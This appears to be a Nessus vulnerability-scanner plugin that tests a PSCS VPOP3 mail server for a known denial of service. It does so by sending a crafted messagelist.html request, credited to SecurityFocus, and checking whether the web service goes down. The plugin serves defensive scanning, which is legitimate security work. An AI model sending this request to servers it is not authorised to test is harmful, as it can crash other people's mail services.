#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(14232);
  script_version("$Revision: 1.17 $");
  script_cvs_date("$Date: 2014/05/26 15:30:09 $");

  script_bugtraq_id(10782);
  script_osvdb_id(8163);

  script_name(english:"PSCS VPOP3 messagelist.html msglistlen Parameter DoS");
  script_summary(english:"Attempt to DoS PSCS VPOP3");

  script_set_attribute(attribute:"synopsis", value:"The remote server is vulnerable to a denial of service.");
  script_set_attribute(attribute:"description", value:
"The remote host is running PSCS VPOP3. The remote server is vulnerable
to an attack which renders the server useless. An attacker would be
able to remotely shut down the server by sending a simple request.");
  script_set_attribute(attribute:"solution", value:"Upgrade to latest version of VPOP3.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2004/07/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2004/08/09");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2004-2014 Tenable Network Security, Inc.");
  script_family(english:"CGI abuses");

  script_dependencie('http_version.nasl');
  script_require_keys("Settings/ParanoidReport");
  script_require_ports("Services/www", 5108);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);
port = get_http_port(default:5108);

if (http_is_dead(port: port)) exit(0);


# exploit string from http://www.securityfocus.com/bid/10782/exploit/
init = string("/messagelist.html?auth=MDA4MDA2MTQ6MTI3LjAuMC4xOmRpbWl0cmlz&msgliststart=0&msglistlen=10&sortfield=date&sortorder=A");

r = http_send_recv3(method: "GET", item:init, port:port);

if (http_is_dead(port: port, retry: 3)) security_warning(port);
